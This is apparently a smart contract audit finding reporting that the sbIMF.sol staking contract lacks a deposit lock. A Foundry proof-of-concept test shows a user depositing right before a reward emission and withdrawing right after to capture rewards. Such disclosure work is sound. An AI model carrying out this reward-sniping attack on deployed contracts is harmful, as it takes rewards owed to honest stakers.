## Description
The `sbIMF.sol` contract allows users to deposit their IMF tokens and earn rewards.
However, lack of a lock mechanism allows this system to be exploited.

## Vulnerability Details
Reward tokens will be sent periodically to the `sbIMF.sol` contract. Lack of a lock
mechanism in the contract allows any malicious user to sandwich attacking reward
emission by depositing their IMF tokens right before and withdrawing them right after.
This leads to malicious users keeping their IMF tokens in the contract for only one block
and still beneting from the rewards as they have kept their tokens in the contract for
the whole duration.

## Proof of Concept
Run the following test in `sbIMFTest.sol`:
```solidity
function testStepwiseJumpExploit() public {
    //mint the tokens for test.
    rewardToken.mint(user2, 5000);
    imfToken.mint(user1, 5000);
    imfToken.mint(user2, 5000);
    imfToken.mint(user3, 5000);
    //user2 deposit tokens
    vm.startPrank(user2);
    imfToken.approve(address(bimf), 5000);
    bimf.mint(1000, 0);
    //user3 deposit tokens
    vm.startPrank(user3);
    imfToken.approve(address(bimf), 5000);
    bimf.mint(1000, 0);
    //user1 deposit just before reward emission
    vm.startPrank(user1);
    imfToken.approve(address(bimf), 5000);
    bimf.mint(5000, 0);
    //reward emission
    vm.startPrank(user2);
    rewardToken.transfer(address(bimf), 1000);
    //withdraw right after reward emission
    vm.startPrank(user1);
    bimf.withdraw(2, 0, 5000);
    vm.stopPrank();
    console.log(rewardToken.balanceOf(user1));
    console.log(imfToken.balanceOf(user1));
}
```
Test will print out the following logs:
```javascript
Logs:
714
5000
```
This test proves that user1 had their tokens in the contract for 1 block and beneted
fully from the reward emission.

## Impact
Malicious users will fully benet from rewards even if they have their tokens deposited
for only 1 block.

## Recommendation
Implement a locking mechanism for users that deposit their tokens
